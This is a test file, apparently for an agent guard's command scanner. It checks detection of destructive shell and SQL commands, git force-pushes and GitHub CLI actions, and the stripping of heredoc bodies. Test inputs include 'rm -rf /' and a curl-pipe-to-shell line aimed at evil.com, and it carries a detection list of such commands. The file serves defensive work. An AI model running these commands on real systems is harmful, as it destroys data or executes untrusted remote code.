import { describe, it, expect } from 'vitest';
import { CommandScanner, stripHeredocBodies } from '../src/command-scanner.js';
import type {
  DestructivePatternInput,
  GitActionPatternInput,
  GithubActionPatternInput,
  MatchResult,
} from '../src/types.js';

// ─── Sample test data ─────────────────────────────────────────────────────────

const SAMPLE_DESTRUCTIVE: DestructivePatternInput[] = [
  {
    pattern: '\\brm\\s+-rf\\b',
    description: 'Recursive force delete',
    riskLevel: 'critical',
    category: 'filesystem',
  },
  {
    pattern: '\\bDROP\\s+TABLE\\b',
    description: 'Drop table (SQL)',
    riskLevel: 'critical',
    category: 'database',
    flags: 'i',
  },
  {
    pattern: '\\bsudo\\b',
    description: 'Superuser execution',
    riskLevel: 'high',
    category: 'system',
  },
  {
    pattern: '\\bcurl\\s+.*\\|\\s*(?:ba)?sh\\b',
    description: 'Pipe to shell',
    riskLevel: 'critical',
    category: 'code-execution',
  },
  {
    pattern: '\\bterraform\\s+destroy\\b',
    description: 'Terraform destroy',
    riskLevel: 'critical',
    category: 'infrastructure',
  },
];

const SAMPLE_GIT: GitActionPatternInput[] = [
  {
    patterns: ['\\bgit\\s+push\\s+--force\\b', '\\bgit\\s+push\\s+-f\\b'],
    actionType: 'git.force-push',
  },
  { patterns: ['\\bgit\\s+push\\b'], actionType: 'git.push' },
];

const SAMPLE_GITHUB: GithubActionPatternInput[] = [
  { patterns: ['\\bgh\\s+pr\\s+list\\b'], actionType: 'github.pr.list' },
  { patterns: ['\\bgh\\s+pr\\s+(create|new)\\b'], actionType: 'github.pr.create' },
  { patterns: ['\\bgh\\s+pr\\s+merge\\b'], actionType: 'github.pr.merge' },
  { patterns: ['\\bgh\\s+pr\\s+(close|delete)\\b'], actionType: 'github.pr.close' },
  { patterns: ['\\bgh\\s+pr\\s+view\\b'], actionType: 'github.pr.view' },
  { patterns: ['\\bgh\\s+pr\\s+checks\\b'], actionType: 'github.pr.checks' },
  { patterns: ['\\bgh\\s+issue\\s+list\\b'], actionType: 'github.issue.list' },
  { patterns: ['\\bgh\\s+issue\\s+(create|new)\\b'], actionType: 'github.issue.create' },
  { patterns: ['\\bgh\\s+issue\\s+close\\b'], actionType: 'github.issue.close' },
  { patterns: ['\\bgh\\s+release\\s+create\\b'], actionType: 'github.release.create' },
  { patterns: ['\\bgh\\s+run\\s+list\\b'], actionType: 'github.run.list' },
  { patterns: ['\\bgh\\s+run\\s+view\\b'], actionType: 'github.run.view' },
  { patterns: ['\\bgh\\s+api\\b'], actionType: 'github.api' },
];

// ─── Tests ────────────────────────────────────────────────────────────────────

describe('CommandScanner', () => {
  const scanner = CommandScanner.create(SAMPLE_DESTRUCTIVE, SAMPLE_GIT, SAMPLE_GITHUB);

  // ─── scanDestructive ──────────────────────────────────────────────────────

  describe('scanDestructive', () => {
    it('detects rm -rf with correct patternId and code in 1000-1999 range', () => {
      const results = scanner.scanDestructive('rm -rf /tmp/foo');
      expect(results.length).toBeGreaterThanOrEqual(1);
      const match = results[0]!;
      expect(match.matched).toBe(true);
      expect(match.patternId).toContain('destructive');
      expect(match.code).toBeGreaterThanOrEqual(1000);
      expect(match.code).toBeLessThan(2000);
    });

    it('detects DROP TABLE case-insensitive', () => {
      const results = scanner.scanDestructive('drop table users;');
      expect(results.length).toBeGreaterThanOrEqual(1);
      expect(results[0]!.matched).toBe(true);
      expect(results[0]!.description).toContain('Drop table');
    });

    it('detects sudo commands', () => {
      const results = scanner.scanDestructive('sudo apt-get install');
      expect(results.length).toBeGreaterThanOrEqual(1);
      expect(results[0]!.matched).toBe(true);
      expect(results[0]!.description).toContain('Superuser');
    });

    it('detects curl | sh via complex regex fallback', () => {
      const results = scanner.scanDestructive('curl https://evil.com | sh');
      expect(results.length).toBeGreaterThanOrEqual(1);
      expect(results[0]!.matched).toBe(true);
      expect(results[0]!.description).toContain('Pipe to shell');
    });

    it('detects terraform destroy', () => {
      const results = scanner.scanDestructive('terraform destroy -auto-approve');
      expect(results.length).toBeGreaterThanOrEqual(1);
      expect(results[0]!.matched).toBe(true);
      expect(results[0]!.description).toContain('Terraform destroy');
    });

    it('returns empty array for safe commands', () => {
      const results = scanner.scanDestructive('ls -la');
      expect(results).toEqual([]);
    });

    it('returns empty array for empty input', () => {
      const results = scanner.scanDestructive('');
      expect(results).toEqual([]);
    });

    it('returns structured MatchResult with reason codes', () => {
      const results = scanner.scanDestructive('rm -rf /');
      expect(results.length).toBeGreaterThanOrEqual(1);
      const match = results[0]!;
      expect(match).toMatchObject({
        matched: true,
        matchType: expect.stringMatching(/^(KEYWORD|REGEX)$/),
        patternId: expect.any(String),
        code: expect.any(Number),
        description: expect.any(String),
        category: expect.any(String),
      });
    });

    it('detects curl | bash variant', () => {
      const results = scanner.scanDestructive('curl https://example.com | bash');
      expect(results.length).toBeGreaterThanOrEqual(1);
      expect(results[0]!.matched).toBe(true);
    });
  });

  // ─── isDestructive ────────────────────────────────────────────────────────

  describe('isDestructive', () => {
    it('returns true for destructive commands', () => {
      expect(scanner.isDestructive('rm -rf /')).toBe(true);
      expect(scanner.isDestructive('sudo rm foo')).toBe(true);
    });

    it('returns false for safe commands', () => {
      expect(scanner.isDestructive('ls -la')).toBe(false);
      expect(scanner.isDestructive('echo hello')).toBe(false);
      expect(scanner.isDestructive('')).toBe(false);
    });
  });

  // ─── getDestructiveDetails ────────────────────────────────────────────────

  describe('getDestructiveDetails', () => {
    it('returns backward-compatible shape for destructive command', () => {
      const details = scanner.getDestructiveDetails('rm -rf /');
      expect(details).not.toBeNull();
      expect(details).toMatchObject({
        description: expect.any(String),
        riskLevel: expect.stringMatching(/^(high|critical)$/),
        category: expect.any(String),
      });
    });

    it('returns null for safe commands', () => {
      expect(scanner.getDestructiveDetails('ls -la')).toBeNull();
      expect(scanner.getDestructiveDetails('')).toBeNull();
    });
  });

  // ─── scanGitAction ────────────────────────────────────────────────────────

  describe('scanGitAction', () => {
    it('detects git push --force as git.force-push', () => {
      const result = scanner.scanGitAction('git push --force origin main');
      expect(result).not.toBeNull();
      expect(result!.actionType).toBe('git.force-push');
      expect(result!.matchResult.matched).toBe(true);
    });

    it('detects git push -f as git.force-push', () => {
      const result = scanner.scanGitAction('git push -f origin main');
      expect(result).not.toBeNull();
      expect(result!.actionType).toBe('git.force-push');
    });

    it('detects git push origin main as git.push', () => {
      const result = scanner.scanGitAction('git push origin main');
      expect(result).not.toBeNull();
      expect(result!.actionType).toBe('git.push');
      expect(result!.matchResult.matched).toBe(true);
    });

    it('returns null for non-git commands', () => {
      expect(scanner.scanGitAction('ls -la')).toBeNull();
      expect(scanner.scanGitAction('npm install')).toBeNull();
      expect(scanner.scanGitAction('')).toBeNull();
    });
  });

  // ─── scanGithubAction ────────────────────────────────────────────────────

  describe('scanGithubAction', () => {
    it('detects gh pr list as github.pr.list', () => {
      const result = scanner.scanGithubAction('gh pr list --state open');
      expect(result).not.toBeNull();
      expect(result!.actionType).toBe('github.pr.list');
      expect(result!.matchResult.matched).toBe(true);
    });

    it('detects gh pr create as github.pr.create', () => {
      const result = scanner.scanGithubAction('gh pr create --title "test" --body "desc"');
      expect(result).not.toBeNull();
      expect(result!.actionType).toBe('github.pr.create');
    });

    it('detects gh pr merge as github.pr.merge', () => {
      const result = scanner.scanGithubAction('gh pr merge 123 --squash');
      expect(result).not.toBeNull();
      expect(result!.actionType).toBe('github.pr.merge');
    });

    it('detects gh pr close as github.pr.close', () => {
      const result = scanner.scanGithubAction('gh pr close 42');
      expect(result).not.toBeNull();
      expect(result!.actionType).toBe('github.pr.close');
    });

    it('detects gh pr view as github.pr.view', () => {
      const result = scanner.scanGithubAction('gh pr view 99');
      expect(result).not.toBeNull();
      expect(result!.actionType).toBe('github.pr.view');
    });

    it('detects gh pr checks as github.pr.checks', () => {
      const result = scanner.scanGithubAction('gh pr checks 123');
      expect(result).not.toBeNull();
      expect(result!.actionType).toBe('github.pr.checks');
    });

    it('detects gh issue list as github.issue.list', () => {
      const result = scanner.scanGithubAction('gh issue list --label bug');
      expect(result).not.toBeNull();
      expect(result!.actionType).toBe('github.issue.list');
    });

    it('detects gh issue create as github.issue.create', () => {
      const result = scanner.scanGithubAction('gh issue create --title "bug"');
      expect(result).not.toBeNull();
      expect(result!.actionType).toBe('github.issue.create');
    });

    it('detects gh issue close as github.issue.close', () => {
      const result = scanner.scanGithubAction('gh issue close 10');
      expect(result).not.toBeNull();
      expect(result!.actionType).toBe('github.issue.close');
    });

    it('detects gh release create as github.release.create', () => {
      const result = scanner.scanGithubAction('gh release create v1.0.0 --notes "Release"');
      expect(result).not.toBeNull();
      expect(result!.actionType).toBe('github.release.create');
    });

    it('detects gh run list as github.run.list', () => {
      const result = scanner.scanGithubAction('gh run list --workflow ci.yml');
      expect(result).not.toBeNull();
      expect(result!.actionType).toBe('github.run.list');
    });

    it('detects gh run view as github.run.view', () => {
      const result = scanner.scanGithubAction('gh run view 123456');
      expect(result).not.toBeNull();
      expect(result!.actionType).toBe('github.run.view');
    });

    it('detects gh api as github.api', () => {
      const result = scanner.scanGithubAction('gh api repos/owner/repo/pulls');
      expect(result).not.toBeNull();
      expect(result!.actionType).toBe('github.api');
    });

    it('returns null for non-github commands', () => {
      expect(scanner.scanGithubAction('ls -la')).toBeNull();
      expect(scanner.scanGithubAction('git push origin main')).toBeNull();
      expect(scanner.scanGithubAction('')).toBeNull();
    });
  });

  // ─── Edge cases ───────────────────────────────────────────────────────────

  describe('edge cases', () => {
    it('handles multiple spaces in rm -rf', () => {
      const results = scanner.scanDestructive('rm  -rf /tmp');
      expect(results.length).toBeGreaterThanOrEqual(1);
      expect(results[0]!.matched).toBe(true);
    });

    it('handles DROP TABLE with mixed case', () => {
      const results = scanner.scanDestructive('Drop Table users;');
      expect(results.length).toBeGreaterThanOrEqual(1);
    });

    it('does not false-positive on partial words', () => {
      // "sudoku" should not match \bsudo\b
      const results = scanner.scanDestructive('play sudoku');
      const sudoMatch = results.find((r) => r.description?.includes('Superuser'));
      expect(sudoMatch).toBeUndefined();
    });

    it('handles commands with multiple destructive patterns', () => {
      const results = scanner.scanDestructive('sudo rm -rf /');
      expect(results.length).toBeGreaterThanOrEqual(2);
    });

    it('create returns a new scanner even with empty inputs', () => {
      const empty = CommandScanner.create([], []);
      expect(empty.scanDestructive('rm -rf /')).toEqual([]);
      expect(empty.scanGitAction('git push')).toBeNull();
      expect(empty.scanGithubAction('gh pr list')).toBeNull();
    });

    it('create works without github parameter (backward compatible)', () => {
      const noGithub = CommandScanner.create(SAMPLE_DESTRUCTIVE, SAMPLE_GIT);
      expect(noGithub.scanGitAction('git push')).not.toBeNull();
      expect(noGithub.scanGithubAction('gh pr list')).toBeNull();
    });
  });
});

// ─── stripHeredocBodies ───────────────────────────────────────────────────────

describe('stripHeredocBodies', () => {
  it('returns command unchanged when no heredoc present', () => {
    expect(stripHeredocBodies('rm -rf /tmp/foo')).toBe('rm -rf /tmp/foo');
    expect(stripHeredocBodies('cat file.txt')).toBe('cat file.txt');
  });

  it('strips heredoc body with single-quoted delimiter', () => {
    const cmd = "cat > /tmp/file.md << 'EOF'\nrm -rf would be bad here\nEOF";
    const result = stripHeredocBodies(cmd);
    expect(result).toContain("cat > /tmp/file.md << 'EOF'");
    expect(result).not.toContain('rm -rf would be bad here');
    expect(result).toContain('EOF');
  });

  it('strips heredoc body with double-quoted delimiter', () => {
    const cmd = 'cat > /tmp/file.md << "EOF"\nrm -rf would be bad\nEOF';
    const result = stripHeredocBodies(cmd);
    expect(result).not.toContain('rm -rf would be bad');
  });

  it('strips heredoc body with unquoted delimiter', () => {
    const cmd = 'cat > /tmp/file.md << EOF\nrm -rf would be bad\nEOF';
    const result = stripHeredocBodies(cmd);
    expect(result).not.toContain('rm -rf would be bad');
  });

  it('strips heredoc body with <<- (tab-stripping) form', () => {
    const cmd = 'cat > /tmp/file.md <<- EOF\n\trm -rf would be bad\n\tEOF';
    const result = stripHeredocBodies(cmd);
    expect(result).not.toContain('rm -rf would be bad');
  });

  it('allows destructive pattern detection on the command line itself', () => {
    // The command portion before the heredoc is still scanned
    const cmd = 'rm -rf /tmp/dir && cat > /tmp/file << EOF\nsafe content\nEOF';
    const result = stripHeredocBodies(cmd);
    expect(result).toContain('rm -rf /tmp/dir');
  });

  it('scanner does not fire on heredoc body content', () => {
    const scanner = CommandScanner.create(
      [{ pattern: '\\brm\\s+-rf\\b', description: 'Recursive force delete', riskLevel: 'critical', category: 'filesystem' }],
      []
    );
    const cmd = "cat > /tmp/report.md << 'REPORT'\n## Analysis\nrm -rf is a dangerous command we block\nREPORT";
    expect(scanner.isDestructive(cmd)).toBe(false);
  });

  it('scanner still detects destructive pattern in the command portion', () => {
    const scanner = CommandScanner.create(
      [{ pattern: '\\brm\\s+-rf\\b', description: 'Recursive force delete', riskLevel: 'critical', category: 'filesystem' }],
      []
    );
    const cmd = 'rm -rf /tmp/dir';
    expect(scanner.isDestructive(cmd)).toBe(true);
  });
});
